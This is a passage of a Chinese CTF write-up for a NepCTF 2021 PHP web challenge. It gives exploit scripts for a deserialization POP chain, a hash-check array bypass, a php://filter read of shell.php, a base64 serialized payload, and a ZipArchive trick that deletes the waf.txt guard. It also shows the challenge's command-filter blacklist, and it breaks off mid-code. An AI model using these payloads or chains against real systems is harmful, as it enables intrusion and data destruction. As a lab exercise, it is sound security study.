class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>分析下，首先要绕<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>，直接数组绕过，传入<code>./?a[]=1&amp;b[]=a</code>即可，如下</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="读取shell-php："><a href="#读取shell-php：" class="headerlink" title="读取shell.php："></a>读取shell.php：</h5><p>看Game类</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>看到<code>__wakeup</code>第一反应可不可以直接绕，看了下版本<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124反序列化绕过wakeup漏洞。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>乖乖走<code>__wakeup</code>，register类没有作用，看来得走login类</p><p>参数<code>register</code>的md5要为<code>21232f297a57a5a743894a0e4a801fc3</code>，一查，<code>admin</code></p><p>那就没问题了，<code>__wakeup</code>将Game类的<code>file</code>/<code>filename</code>/<code>content</code>传入login，利用login的<code>__construct</code>赋值</p><p>Game类的变量choice即login类，利用Game类<code>__destruct</code>触发login类的checking函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>login类的checking函数检查赋值的username和password，即Game类传过来的username和password。然后调用file即Game类的file的open函数。由于没有<code>__call</code>之类的魔术方法，不需要考虑其他。即本题所有变量都可在Game类直接赋值。</p><p>关键点就在于Open类了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>如图所示，存在waf.txt，<code>file_get_contents</code>为true，即存在waf.txt时会<code>file_get_contents($filename.&quot;.php&quot;);</code>，否则会<code>shell($content);</code>所以我们首先要利用伪协议读取<code>shell.php</code>的内容。</p><p>exp1.php如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 目录下必须有 shell.php waf.txt</span></span></code></pre><p>得到payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>读取到<code>shell.php</code>内容</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是传入一个命令，过滤一堆读取函数然后长度要小于10并读取flag。</p><p>稍后再研究，那么现在的问题就是进shell函数，然而进shell函数写死了必须要waf.txt不存在。但waf.txt是有的</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>这就为难我胖虎了，思路至此over了。</p><hr><h5 id="删除waf-txt："><a href="#删除waf-txt：" class="headerlink" title="删除waf.txt："></a>删除waf.txt：</h5><p>寻找大佬博客文章，找到了指引思路的<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">文章</a>，2019bytectf的一道web题EzCMS，原题要删除/覆盖目录下<code>.hatccess</code>，刚好本题的login类有漏洞可寻，php手册里查找open的同名函数，利用<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>，其第二个参数里存在能覆盖指定文件的模式，直接删掉<code>waf.txt</code></p><p>于是准备好了phar文件准备‘远程phar’反序列化，但是phar伪协议是不可以远程的</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>孩子比较呆，测了有一会。这里受到了那题固有思维的影响，其实并不需要打phar反序列化的，由login类中checking函数<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>，直接令Game类的file new一个ZipArchive()，filename即为waf.txt，content为模式<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>，也就是9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>测试如下</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>可见waf.txt成功被删除，exp2如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'类同上    '</span><span class="token single-quoted-string string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token 